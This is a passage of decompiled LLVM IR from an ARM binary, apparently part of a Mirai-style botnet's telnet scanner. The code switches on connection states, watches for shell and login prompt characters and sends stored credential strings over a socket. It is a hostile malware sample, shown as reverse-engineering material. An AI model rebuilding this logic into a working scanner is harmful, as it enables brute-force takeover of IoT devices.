  %v2_eff4 = add i32 %v1_eff4, 8
  %v3_eff4 = inttoptr i32 %v2_eff4 to i32*
  store i32 %v0_eff4, i32* %v3_eff4, align 4
  br label %dec_label_pc_eff8

dec_label_pc_eff8:                                ; preds = %dec_label_pc_f114, %dec_label_pc_efe0
  %v0_eff8 = load i32, i32* @r6, align 4
  %v1_eff8 = add i32 %v0_eff8, 12
  %v2_eff8 = inttoptr i32 %v1_eff8 to i32*
  %v3_eff8 = load i32, i32* %v2_eff8, align 4
  store i32 %v3_eff8, i32* %r0.global-to-local, align 4
  %v1_effc = add i32 %v3_eff8, -2
  store i32 %v1_effc, i32* @r3, align 4
  %v7_f000 = icmp eq i32 %v1_effc, 8
  store i1 %v7_f000, i1* %cpsr_z.global-to-local, align 1
  %v5_f004 = and i32 %v1_effc, 1073741824
  %v6_f004 = icmp ne i32 %v5_f004, 0
  store i1 %v6_f004, i1* %cpsr_c.global-to-local, align 1
  switch i32 %v3_eff8, label %dec_label_pc_ef7c.backedge [
    i32 2, label %dec_label_pc_f2e4
    i32 3, label %dec_label_pc_f79c
    i32 4, label %dec_label_pc_f6a8
    i32 5, label %dec_label_pc_f488
    i32 6, label %dec_label_pc_f3b4
    i32 7, label %dec_label_pc_f5d4
    i32 8, label %dec_label_pc_f210
    i32 9, label %dec_label_pc_f13c
    i32 10, label %dec_label_pc_f098
  ]

dec_label_pc_f030:                                ; preds = %dec_label_pc_ef94
  br i1 %v2_efb8, label %dec_label_pc_fb88, label %dec_label_pc_f034

dec_label_pc_f034:                                ; preds = %dec_label_pc_f030
  %v3_f034 = icmp eq i32 %v4_efb4, -1
  store i1 %v3_f034, i1* %cpsr_c.global-to-local, align 1
  %v8_f034 = icmp eq i32 %v4_efb4, -1
  store i1 %v8_f034, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_f034, label %dec_label_pc_f03c, label %dec_label_pc_efe0

dec_label_pc_f03c:                                ; preds = %dec_label_pc_f034
  %v0_f03c = load i32, i32* @fp, align 4
  %v1_f03c = inttoptr i32 %v0_f03c to i32*
  %v2_f03c = load i32, i32* %v1_f03c, align 4
  store i32 %v2_f03c, i32* %r3.global-to-local, align 4
  %v2_f040 = icmp ugt i32 %v2_f03c, 10
  store i1 %v2_f040, i1* %cpsr_c.global-to-local, align 1
  %v7_f040 = icmp eq i32 %v2_f03c, 11
  store i1 %v7_f040, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f040, label %dec_label_pc_f080, label %dec_label_pc_f048

dec_label_pc_f048:                                ; preds = %dec_label_pc_f03c, %dec_label_pc_fb88
  %v0_f048 = load i32, i32* @r6, align 4
  %v1_f048 = add i32 %v0_f048, 4
  %v2_f048 = inttoptr i32 %v1_f048 to i32*
  %v3_f048 = load i32, i32* %v2_f048, align 4
  store i32 %v3_f048, i32* %r0.global-to-local, align 4
  %v1_f04c = call i32 @__GI___libc_close(i32 %v3_f048)
  store i32 %v1_f04c, i32* %r0.global-to-local, align 4
  %v0_f050 = load i32, i32* @r6, align 4
  %v1_f050 = add i32 %v0_f050, 284
  %v2_f050 = inttoptr i32 %v1_f050 to i8*
  %v3_f050 = load i8, i8* %v2_f050, align 1
  %v4_f050 = zext i8 %v3_f050 to i32
  %v1_f054 = add nuw nsw i32 %v4_f050, 1
  %v1_f058 = urem i32 %v1_f054, 256
  store i32 %v1_f058, i32* %r3.global-to-local, align 4
  %v2_f05c = icmp ugt i32 %v1_f058, 8
  store i1 %v2_f05c, i1* %cpsr_c.global-to-local, align 1
  %v7_f05c = icmp eq i32 %v1_f058, 9
  store i1 %v7_f05c, i1* %cpsr_z.global-to-local, align 1
  %v1_f060 = trunc i32 %v1_f054 to i8
  store i8 %v1_f060, i8* %v2_f050, align 1
  store i32 -1, i32* %r2.global-to-local, align 4
  %v0_f068 = load i1, i1* %cpsr_c.global-to-local, align 1
  %v1_f068 = load i1, i1* %cpsr_z.global-to-local, align 1
  %v2_f068 = xor i1 %v1_f068, true
  %v3_f068 = and i1 %v0_f068, %v2_f068
  br i1 %v3_f068, label %bb421, label %.thread313

.thread313:                                       ; preds = %dec_label_pc_f048
  %v1_f06c309314 = load i32, i32* @r6, align 4
  %v2_f06c310315 = add i32 %v1_f06c309314, 4
  %v3_f06c311316 = inttoptr i32 %v2_f06c310315 to i32*
  store i32 -1, i32* %v3_f06c311316, align 4
  br label %bb422

bb421:                                            ; preds = %dec_label_pc_f048
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_f06c305 = load i32, i32* @r6, align 4
  %v2_f06c306 = add i32 %v1_f06c305, 4
  %v3_f06c307 = inttoptr i32 %v2_f06c306 to i32*
  store i32 -1, i32* %v3_f06c307, align 4
  %v4_f070 = load i32, i32* %r3.global-to-local, align 4
  %v5_f070 = load i32, i32* @r6, align 4
  %v6_f070 = add i32 %v5_f070, 12
  %v7_f070 = inttoptr i32 %v6_f070 to i32*
  store i32 %v4_f070, i32* %v7_f070, align 4
  %v4_f074 = load i32, i32* %r3.global-to-local, align 4
  %v5_f074 = trunc i32 %v4_f074 to i8
  %v6_f074 = load i32, i32* @r6, align 4
  %v7_f074 = add i32 %v6_f074, 284
  %v8_f074 = inttoptr i32 %v7_f074 to i8*
  store i8 %v5_f074, i8* %v8_f074, align 1
  %v0_f078.pre = load i1, i1* %cpsr_z.global-to-local, align 1
  %v1_f078.pre = load i1, i1* %cpsr_c.global-to-local, align 1
  br label %bb422

bb422:                                            ; preds = %.thread313, %bb421
  %v1_f07c = phi i1 [ %v1_f078.pre, %bb421 ], [ %v0_f068, %.thread313 ]
  %v0_f07c = phi i1 [ %v0_f078.pre, %bb421 ], [ %v1_f068, %.thread313 ]
  %v2_f078 = xor i1 %v1_f07c, true
  %v3_f078 = or i1 %v0_f07c, %v2_f078
  br i1 %v3_f078, label %bb423, label %bb424

bb423:                                            ; preds = %bb422
  %v4_f078 = load i32, i32* @r6, align 4
  store i32 %v4_f078, i32* %r0.global-to-local, align 4
  br label %bb424

bb424:                                            ; preds = %bb422, %bb423
  store i32 61568, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_f078, i32 ptrtoint (i32* @global_var_e36c.203 to i32))
  br label %dec_label_pc_f080

dec_label_pc_f080:                                ; preds = %dec_label_pc_ef78.loopexit, %dec_label_pc_ef7c.backedge, %dec_label_pc_ef78.preheader, %dec_label_pc_f03c, %dec_label_pc_ef60, %dec_label_pc_ef18, %dec_label_pc_fb6c, %bb424
  %v3_f080 = load i32, i32* %stack_var_-52, align 4
  store i32 %v3_f080, i32* %r3.global-to-local, align 4
  %v1_f084 = add i32 %v3_f080, 1
  store i32 %v1_f084, i32* @r4, align 4
  %v2_f088 = icmp ugt i32 %v1_f084, 254
  store i1 %v2_f088, i1* %cpsr_c.global-to-local, align 1
  %v7_f088 = icmp eq i32 %v1_f084, 255
  store i1 %v7_f088, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_f084, i32* %stack_var_-52, align 4
  %v7_f090 = icmp slt i32 %v1_f084, 256
  br i1 %v7_f090, label %dec_label_pc_ef18, label %dec_label_pc_e898

dec_label_pc_f098:                                ; preds = %dec_label_pc_eff8
  store i32 12, i32* %r0.global-to-local, align 4
  %v1_f09c = call i32 @table_unlock_val(i32 12)
  store i32 %v2_f82c, i32* %r1.global-to-local, align 4
  store i32 12, i32* %r0.global-to-local, align 4
  %v3_f0ac = call i32 @table_retrieve_val(i32 12, i32* nonnull %stack_var_-60)
  %v3_f0b0 = load i32, i32* %stack_var_-60, align 4
  store i32 %v3_f0ac, i32* %r2.global-to-local, align 4
  %v1_f0b8 = add i32 %v3_f0b0, -1
  store i32 %v1_f0b8, i32* %r3.global-to-local, align 4
  %v0_f0bc = load i32, i32* @sb, align 4
  store i32 %v0_f0bc, i32* %r0.global-to-local, align 4
  %v0_f0c0 = load i32, i32* @r6, align 4
  %v1_f0c0 = add i32 %v0_f0c0, 24
  %v2_f0c0 = inttoptr i32 %v1_f0c0 to i32*
  %v3_f0c0 = load i32, i32* %v2_f0c0, align 4
  store i32 %v3_f0c0, i32* %r1.global-to-local, align 4
  %v4_f0c4 = call i32 @util_memsearch(i32 %v0_f0bc, i32 %v3_f0c0, i32 %v3_f0ac, i32 %v1_f0b8)
  %v2_f0c8 = icmp eq i32 %v4_f0c4, -1
  store i1 %v2_f0c8, i1* %cpsr_c.global-to-local, align 1
  %v7_f0c8 = icmp eq i32 %v4_f0c4, -1
  store i1 %v7_f0c8, i1* %cpsr_z.global-to-local, align 1
  store i32 %v4_f0c4, i32* @r4, align 4
  store i32 12, i32* %r0.global-to-local, align 4
  %v1_f990 = call i32 @table_lock_val(i32 12)
  br i1 %v7_f0c8, label %dec_label_pc_f98c, label %dec_label_pc_f0d4

dec_label_pc_f0d4:                                ; preds = %dec_label_pc_f098
  store i32 %v1_f990, i32* %r0.global-to-local, align 4
  %v0_f0dc = load i32, i32* @r6, align 4
  %v1_f0dc = add i32 %v0_f0dc, 4
  %v2_f0dc = inttoptr i32 %v1_f0dc to i32*
  %v3_f0dc = load i32, i32* %v2_f0dc, align 4
  store i32 %v3_f0dc, i32* %r0.global-to-local, align 4
  %v1_f0e0 = call i32 @__GI___libc_close(i32 %v3_f0dc)
  store i32 %v1_f0e0, i32* %r0.global-to-local, align 4
  %v0_f0e4 = load i32, i32* @r6, align 4
  %v1_f0e4 = add i32 %v0_f0e4, 284
  %v2_f0e4 = inttoptr i32 %v1_f0e4 to i8*
  %v3_f0e4 = load i8, i8* %v2_f0e4, align 1
  %v4_f0e4 = zext i8 %v3_f0e4 to i32
  %v1_f0e8 = add nuw nsw i32 %v4_f0e4, 1
  %v1_f0ec = urem i32 %v1_f0e8, 256
  store i32 %v1_f0ec, i32* @r3, align 4
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_f0f4 = icmp ugt i32 %v1_f0ec, 9
  store i1 %v2_f0f4, i1* %cpsr_c.global-to-local, align 1
  %v7_f0f4 = icmp eq i32 %v1_f0ec, 10
  store i1 %v7_f0f4, i1* %cpsr_z.global-to-local, align 1
  %v2_f0f8 = add i32 %v0_f0e4, 4
  %v3_f0f8 = inttoptr i32 %v2_f0f8 to i32*
  store i32 -1, i32* %v3_f0f8, align 4
  %v0_f0fc = load i32, i32* @r3, align 4
  %v1_f0fc = trunc i32 %v0_f0fc to i8
  %v2_f0fc = load i32, i32* @r6, align 4
  %v3_f0fc = add i32 %v2_f0fc, 284
  %v4_f0fc = inttoptr i32 %v3_f0fc to i8*
  store i8 %v1_f0fc, i8* %v4_f0fc, align 1
  %v0_f100 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_f100, label %dec_label_pc_f104, label %dec_label_pc_fa7c

dec_label_pc_f104:                                ; preds = %dec_label_pc_f0d4
  store i32 0, i32* @r3, align 4
  %v1_f108 = load i32, i32* @r6, align 4
  %v2_f108 = add i32 %v1_f108, 12
  %v3_f108 = inttoptr i32 %v2_f108 to i32*
  store i32 0, i32* %v3_f108, align 4
  %v0_f10c = load i32, i32* @r3, align 4
  %v1_f10c = trunc i32 %v0_f10c to i8
  %v2_f10c = load i32, i32* @r6, align 4
  %v3_f10c = add i32 %v2_f10c, 284
  %v4_f10c = inttoptr i32 %v3_f10c to i8*
  store i8 %v1_f10c, i8* %v4_f10c, align 1
  br label %dec_label_pc_f110

dec_label_pc_f110:                                ; preds = %dec_label_pc_fa7c, %dec_label_pc_f104
  store i32 -1, i32* @r7, align 4
  br label %dec_label_pc_f114

dec_label_pc_f114:                                ; preds = %dec_label_pc_f790, %dec_label_pc_f650, %dec_label_pc_f504, %dec_label_pc_f430, %dec_label_pc_f28c, %dec_label_pc_f1b8, %dec_label_pc_f110
  %v0_f114 = load i32, i32* @r6, align 4
  %v1_f114 = add i32 %v0_f114, 24
  %v2_f114 = inttoptr i32 %v1_f114 to i32*
  %v3_f114 = load i32, i32* %v2_f114, align 4
  %v0_f118 = load i32, i32* @r7, align 4
  %v2_f118 = sub i32 %v0_f118, %v3_f114
  %v3_f118 = icmp uge i32 %v0_f118, %v3_f114
  store i1 %v3_f118, i1* %cpsr_c.global-to-local, align 1
  %v4_f118 = xor i32 %v0_f118, %v3_f114
  %v5_f118 = xor i32 %v2_f118, %v0_f118
  %v6_f118 = and i32 %v5_f118, %v4_f118
  %v7_f118 = icmp slt i32 %v6_f118, 0
  %v8_f118 = icmp slt i32 %v2_f118, 0
  %v9_f118 = icmp eq i32 %v0_f118, %v3_f114
  store i1 %v9_f118, i1* %cpsr_z.global-to-local, align 1
  %v2_f11c = xor i1 %v8_f118, %v7_f118
  %v0_f118.v3_f114 = select i1 %v2_f11c, i32 %v0_f118, i32 %v3_f114
  store i32 %v0_f118.v3_f114, i32* %r1.global-to-local, align 4
  %v2_f124 = sub i32 %v3_f114, %v0_f118.v3_f114
  store i32 %v2_f124, i32* @r2, align 4
  store i32 %v2_f124, i32* %v2_f114, align 4
  %v0_f12c = load i32, i32* @sb, align 4
  %v1_f12c = load i32, i32* %r1.global-to-local, align 4
  %v2_f12c = add i32 %v1_f12c, %v0_f12c
  store i32 %v2_f12c, i32* @r1, align 4
  store i32 %v0_f12c, i32* @r0, align 4
  %v3_f134 = call i32 @memmove(i32 %v0_f12c, i32 %v2_f12c, i32 %v2_f124)
  store i32 %v3_f134, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_eff8

dec_label_pc_f13c:                                ; preds = %dec_label_pc_eff8
  %v1_f13c = add i32 %v0_eff8, 24
  %v2_f13c = inttoptr i32 %v1_f13c to i32*
  %v3_f13c = load i32, i32* %v2_f13c, align 4
  store i32 %v3_f13c, i32* %r2.global-to-local, align 4
  %v1_f140 = add i32 %v3_f13c, -1
  store i32 %v1_f140, i32* %r1.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f144 = icmp eq i32 %v1_f140, 0
  store i1 %v2_f144, i1* %cpsr_z.global-to-local, align 1
  %tmp427 = icmp slt i32 %v1_f140, 1
  br i1 %tmp427, label %dec_label_pc_ef7c.backedge.thread, label %dec_label_pc_f14c

dec_label_pc_f14c:                                ; preds = %dec_label_pc_f13c
  %v2_f14c = add i32 %v1_f140, %v0_eff8
  store i32 %v2_f14c, i32* %r3.global-to-local, align 4
  %v1_f150 = add i32 %v2_f14c, 28
  %v2_f150 = inttoptr i32 %v1_f150 to i8*
  %v3_f150 = load i8, i8* %v2_f150, align 1
  %v4_f150 = zext i8 %v3_f150 to i32
  store i32 %v4_f150, i32* %r3.global-to-local, align 4
  %v2_f154 = icmp ugt i8 %v3_f150, 61
  store i1 %v2_f154, i1* %cpsr_c.global-to-local, align 1
  %v7_f154 = icmp eq i8 %v3_f150, 62
  store i1 %v7_f154, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f154, label %dec_label_pc_f1b8, label %bb428

bb428:                                            ; preds = %dec_label_pc_f14c
  %v3_f158 = icmp ugt i8 %v3_f150, 57
  store i1 %v3_f158, i1* %cpsr_c.global-to-local, align 1
  %v8_f158 = icmp eq i8 %v3_f150, 58
  store i1 %v8_f158, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_f158, label %dec_label_pc_f1b8, label %dec_label_pc_f160

dec_label_pc_f160:                                ; preds = %bb428
  %v2_f160 = icmp ugt i8 %v3_f150, 35
  store i1 %v2_f160, i1* %cpsr_c.global-to-local, align 1
  %v7_f160 = icmp eq i8 %v3_f150, 36
  store i1 %v7_f160, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f160, label %dec_label_pc_f1b8, label %dec_label_pc_f168

dec_label_pc_f168:                                ; preds = %dec_label_pc_f160
  %v2_f168 = icmp ugt i8 %v3_f150, 34
  store i1 %v2_f168, i1* %cpsr_c.global-to-local, align 1
  %v7_f168 = icmp eq i8 %v3_f150, 35
  store i1 %v7_f168, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f168, label %dec_label_pc_f1b8, label %dec_label_pc_f170

dec_label_pc_f170:                                ; preds = %dec_label_pc_f168
  %v2_f170 = icmp ugt i8 %v3_f150, 36
  store i1 %v2_f170, i1* %cpsr_c.global-to-local, align 1
  %v7_f170 = icmp eq i8 %v3_f150, 37
  store i1 %v7_f170, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f170, label %dec_label_pc_f1b8, label %dec_label_pc_f1a0.preheader

dec_label_pc_f1a0.preheader:                      ; preds = %dec_label_pc_f170
  %v3_f174 = add i32 %v0_eff8, 28
  %v2_f178 = add i32 %v3_f174, %v3_f13c
  store i32 %v2_f178, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_f1a0

dec_label_pc_f184:                                ; preds = %bb429
  %v2_f184 = icmp ugt i8 %v3_f1a8, 35
  store i1 %v2_f184, i1* %cpsr_c.global-to-local, align 1
  %v7_f184 = icmp eq i8 %v3_f1a8, 36
  store i1 %v7_f184, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f184, label %dec_label_pc_f1b8, label %dec_label_pc_f18c

dec_label_pc_f18c:                                ; preds = %dec_label_pc_f184
  %v2_f18c = icmp ugt i8 %v3_f1a8, 34
  store i1 %v2_f18c, i1* %cpsr_c.global-to-local, align 1
  %v7_f18c = icmp eq i8 %v3_f1a8, 35
  store i1 %v7_f18c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f18c, label %dec_label_pc_f1b8, label %dec_label_pc_f194

dec_label_pc_f194:                                ; preds = %dec_label_pc_f18c
  %v2_f194 = icmp ugt i8 %v3_f1a8, 36
  store i1 %v2_f194, i1* %cpsr_c.global-to-local, align 1
  %v7_f194 = icmp eq i8 %v3_f1a8, 37
  store i1 %v7_f194, i1* %cpsr_z.global-to-local, align 1
  %v1_f198 = add i32 %v0_f198, -1
  store i32 %v1_f198, i32* %r3.global-to-local, align 4
  br i1 %v7_f194, label %dec_label_pc_f1b8, label %dec_label_pc_f1a0

dec_label_pc_f1a0:                                ; preds = %dec_label_pc_f1a0.preheader, %dec_label_pc_f194
  %v0_f198 = phi i32 [ %v2_f178, %dec_label_pc_f1a0.preheader ], [ %v1_f198, %dec_label_pc_f194 ]
  %v0_f1a0 = phi i32 [ %v1_f140, %dec_label_pc_f1a0.preheader ], [ %v1_f1a0, %dec_label_pc_f194 ]
  %v1_f1a0 = add i32 %v0_f1a0, -1
  store i32 %v1_f1a0, i32* %r1.global-to-local, align 4
  %v2_f1a0 = icmp ne i32 %v0_f1a0, 0
  store i1 %v2_f1a0, i1* %cpsr_c.global-to-local, align 1
  %v7_f1a0 = icmp eq i32 %v0_f1a0, 1
  store i1 %v7_f1a0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f1a0, label %dec_label_pc_ef7c.backedge.thread561, label %dec_label_pc_f1a8

dec_label_pc_f1a8:                                ; preds = %dec_label_pc_f1a0
  %v1_f1a8 = add i32 %v0_f198, -2
  %v2_f1a8 = inttoptr i32 %v1_f1a8 to i8*
  %v3_f1a8 = load i8, i8* %v2_f1a8, align 1
  %v4_f1a8 = zext i8 %v3_f1a8 to i32
  store i32 %v4_f1a8, i32* %r2.global-to-local, align 4
  %v2_f1ac = icmp ugt i8 %v3_f1a8, 61
  store i1 %v2_f1ac, i1* %cpsr_c.global-to-local, align 1
  %v7_f1ac = icmp eq i8 %v3_f1a8, 62
  store i1 %v7_f1ac, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f1ac, label %dec_label_pc_f1b8, label %bb429

bb429:                                            ; preds = %dec_label_pc_f1a8
  %v3_f1b0 = icmp ugt i8 %v3_f1a8, 57
  store i1 %v3_f1b0, i1* %cpsr_c.global-to-local, align 1
  %v8_f1b0 = icmp eq i8 %v3_f1a8, 58
  store i1 %v8_f1b0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_f1b0, label %dec_label_pc_f1b8, label %dec_label_pc_f184

dec_label_pc_f1b8:                                ; preds = %dec_label_pc_f1a8, %bb429, %dec_label_pc_f194, %dec_label_pc_f18c, %dec_label_pc_f184, %dec_label_pc_f170, %dec_label_pc_f14c, %dec_label_pc_f168, %dec_label_pc_f160, %bb428
  %v0_f1bc = phi i32 [ %v1_f140, %dec_label_pc_f170 ], [ %v1_f140, %dec_label_pc_f14c ], [ %v1_f140, %dec_label_pc_f168 ], [ %v1_f140, %dec_label_pc_f160 ], [ %v1_f140, %bb428 ], [ %v1_f1a0, %dec_label_pc_f184 ], [ %v1_f1a0, %dec_label_pc_f18c ], [ %v1_f1a0, %dec_label_pc_f194 ], [ %v1_f1a0, %bb429 ], [ %v1_f1a0, %dec_label_pc_f1a8 ]
  store i32 10, i32* %r0.global-to-local, align 4
  %v1_f1bc = add i32 %v0_f1bc, 1
  store i32 %v1_f1bc, i32* @r7, align 4
  %v1_f1c0 = call i32 @table_unlock_val(i32 10)
  store i32 %v2_f82c, i32* %r1.global-to-local, align 4
  store i32 10, i32* %r0.global-to-local, align 4
  %v3_f1d0 = call i32 @table_retrieve_val(i32 10, i32* nonnull %stack_var_-60)
  store i32 %v3_f1d0, i32* %r0.global-to-local, align 4
  %v3_f1d4 = load i32, i32* %stack_var_-60, align 4
  store i32 %v3_f1d4, i32* %r2.global-to-local, align 4
  store i32 %v3_f1d0, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_f1e0 = load i32, i32* @r6, align 4
  %v1_f1e0 = add i32 %v0_f1e0, 4
  %v2_f1e0 = inttoptr i32 %v1_f1e0 to i32*
  %v3_f1e0 = load i32, i32* %v2_f1e0, align 4
  store i32 %v3_f1e0, i32* %r0.global-to-local, align 4
  %v4_f1e4 = call i32 @__libc_send(i32 %v3_f1e0, i32 %v3_f1d0, i32 %v3_f1d4, i32 16384)
  store i32 %v4_f1e4, i32* %r0.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_19320.205 to i32), i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v0_f1f4 = load i32, i32* @r6, align 4
  %v1_f1f4 = add i32 %v0_f1f4, 4
  %v2_f1f4 = inttoptr i32 %v1_f1f4 to i32*
  %v3_f1f4 = load i32, i32* %v2_f1f4, align 4
  store i32 %v3_f1f4, i32* %r0.global-to-local, align 4
  %v4_f1f8 = call i32 @__libc_send(i32 %v3_f1f4, i32 ptrtoint ([3 x i8]* @global_var_19320.205 to i32), i32 2, i32 16384)
  store i32 10, i32* %r0.global-to-local, align 4
  %v1_f200 = call i32 @table_lock_val(i32 10)
  store i32 %v1_f200, i32* %r0.global-to-local, align 4
  store i32 10, i32* @r3, align 4
  %v1_f208 = load i32, i32* @r6, align 4
  %v2_f208 = add i32 %v1_f208, 12
  %v3_f208 = inttoptr i32 %v2_f208 to i32*
  store i32 10, i32* %v3_f208, align 4
  br label %dec_label_pc_f114

dec_label_pc_f210:                                ; preds = %dec_label_pc_eff8
  %v1_f210 = add i32 %v0_eff8, 24
  %v2_f210 = inttoptr i32 %v1_f210 to i32*
  %v3_f210 = load i32, i32* %v2_f210, align 4
  store i32 %v3_f210, i32* %r2.global-to-local, align 4
  %v1_f214 = add i32 %v3_f210, -1
  store i32 %v1_f214, i32* %r1.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f218 = icmp eq i32 %v1_f214, 0
  store i1 %v2_f218, i1* %cpsr_z.global-to-local, align 1
  %tmp430 = icmp slt i32 %v1_f214, 1
  br i1 %tmp430, label %dec_label_pc_ef7c.backedge.thread, label %dec_label_pc_f220

dec_label_pc_f220:                                ; preds = %dec_label_pc_f210
  %v2_f220 = add i32 %v1_f214, %v0_eff8
  store i32 %v2_f220, i32* %r3.global-to-local, align 4
  %v1_f224 = add i32 %v2_f220, 28
  %v2_f224 = inttoptr i32 %v1_f224 to i8*
  %v3_f224 = load i8, i8* %v2_f224, align 1
  %v4_f224 = zext i8 %v3_f224 to i32
  store i32 %v4_f224, i32* %r3.global-to-local, align 4
  %v2_f228 = icmp ugt i8 %v3_f224, 61
  store i1 %v2_f228, i1* %cpsr_c.global-to-local, align 1
  %v7_f228 = icmp eq i8 %v3_f224, 62
  store i1 %v7_f228, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f228, label %dec_label_pc_f28c, label %bb431

bb431:                                            ; preds = %dec_label_pc_f220
  %v3_f22c = icmp ugt i8 %v3_f224, 57
  store i1 %v3_f22c, i1* %cpsr_c.global-to-local, align 1
  %v8_f22c = icmp eq i8 %v3_f224, 58
  store i1 %v8_f22c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_f22c, label %dec_label_pc_f28c, label %dec_label_pc_f234

dec_label_pc_f234:                                ; preds = %bb431
  %v2_f234 = icmp ugt i8 %v3_f224, 35
  store i1 %v2_f234, i1* %cpsr_c.global-to-local, align 1
  %v7_f234 = icmp eq i8 %v3_f224, 36
  store i1 %v7_f234, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f234, label %dec_label_pc_f28c, label %dec_label_pc_f23c

dec_label_pc_f23c:                                ; preds = %dec_label_pc_f234
  %v2_f23c = icmp ugt i8 %v3_f224, 34
  store i1 %v2_f23c, i1* %cpsr_c.global-to-local, align 1
  %v7_f23c = icmp eq i8 %v3_f224, 35
  store i1 %v7_f23c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f23c, label %dec_label_pc_f28c, label %dec_label_pc_f244

dec_label_pc_f244:                                ; preds = %dec_label_pc_f23c
  %v2_f244 = icmp ugt i8 %v3_f224, 36
  store i1 %v2_f244, i1* %cpsr_c.global-to-local, align 1
  %v7_f244 = icmp eq i8 %v3_f224, 37
  store i1 %v7_f244, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f244, label %dec_label_pc_f28c, label %dec_label_pc_f274.preheader

dec_label_pc_f274.preheader:                      ; preds = %dec_label_pc_f244
  %v3_f248 = add i32 %v0_eff8, 28
  %v2_f24c = add i32 %v3_f248, %v3_f210
  store i32 %v2_f24c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_f274

dec_label_pc_f258:                                ; preds = %bb432
  %v2_f258 = icmp ugt i8 %v3_f27c, 35
  store i1 %v2_f258, i1* %cpsr_c.global-to-local, align 1
  %v7_f258 = icmp eq i8 %v3_f27c, 36
  store i1 %v7_f258, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f258, label %dec_label_pc_f28c, label %dec_label_pc_f260

dec_label_pc_f260:                                ; preds = %dec_label_pc_f258
  %v2_f260 = icmp ugt i8 %v3_f27c, 34
  store i1 %v2_f260, i1* %cpsr_c.global-to-local, align 1
  %v7_f260 = icmp eq i8 %v3_f27c, 35
  store i1 %v7_f260, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f260, label %dec_label_pc_f28c, label %dec_label_pc_f268

dec_label_pc_f268:                                ; preds = %dec_label_pc_f260
  %v2_f268 = icmp ugt i8 %v3_f27c, 36
  store i1 %v2_f268, i1* %cpsr_c.global-to-local, align 1
  %v7_f268 = icmp eq i8 %v3_f27c, 37
  store i1 %v7_f268, i1* %cpsr_z.global-to-local, align 1
  %v1_f26c = add i32 %v0_f26c, -1
  store i32 %v1_f26c, i32* %r3.global-to-local, align 4
  br i1 %v7_f268, label %dec_label_pc_f28c, label %dec_label_pc_f274

dec_label_pc_f274:                                ; preds = %dec_label_pc_f274.preheader, %dec_label_pc_f268
  %v0_f26c = phi i32 [ %v2_f24c, %dec_label_pc_f274.preheader ], [ %v1_f26c, %dec_label_pc_f268 ]
  %v0_f274 = phi i32 [ %v1_f214, %dec_label_pc_f274.preheader ], [ %v1_f274, %dec_label_pc_f268 ]
  %v1_f274 = add i32 %v0_f274, -1
  store i32 %v1_f274, i32* %r1.global-to-local, align 4
  %v2_f274 = icmp ne i32 %v0_f274, 0
  store i1 %v2_f274, i1* %cpsr_c.global-to-local, align 1
  %v7_f274 = icmp eq i32 %v0_f274, 1
  store i1 %v7_f274, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f274, label %dec_label_pc_ef7c.backedge.thread561, label %dec_label_pc_f27c

dec_label_pc_f27c:                                ; preds = %dec_label_pc_f274
  %v1_f27c = add i32 %v0_f26c, -2
  %v2_f27c = inttoptr i32 %v1_f27c to i8*
  %v3_f27c = load i8, i8* %v2_f27c, align 1
  %v4_f27c = zext i8 %v3_f27c to i32
  store i32 %v4_f27c, i32* %r2.global-to-local, align 4
  %v2_f280 = icmp ugt i8 %v3_f27c, 61
  store i1 %v2_f280, i1* %cpsr_c.global-to-local, align 1
  %v7_f280 = icmp eq i8 %v3_f27c, 62
  store i1 %v7_f280, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f280, label %dec_label_pc_f28c, label %bb432

bb432:                                            ; preds = %dec_label_pc_f27c
  %v3_f284 = icmp ugt i8 %v3_f27c, 57
  store i1 %v3_f284, i1* %cpsr_c.global-to-local, align 1
  %v8_f284 = icmp eq i8 %v3_f27c, 58
  store i1 %v8_f284, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_f284, label %dec_label_pc_f28c, label %dec_label_pc_f258

dec_label_pc_f28c:                                ; preds = %dec_label_pc_f27c, %bb432, %dec_label_pc_f268, %dec_label_pc_f260, %dec_label_pc_f258, %dec_label_pc_f244, %dec_label_pc_f220, %dec_label_pc_f23c, %dec_label_pc_f234, %bb431
  %v0_f290 = phi i32 [ %v1_f214, %dec_label_pc_f244 ], [ %v1_f214, %dec_label_pc_f220 ], [ %v1_f214, %dec_label_pc_f23c ], [ %v1_f214, %dec_label_pc_f234 ], [ %v1_f214, %bb431 ], [ %v1_f274, %dec_label_pc_f258 ], [ %v1_f274, %dec_label_pc_f260 ], [ %v1_f274, %dec_label_pc_f268 ], [ %v1_f274, %bb432 ], [ %v1_f274, %dec_label_pc_f27c ]
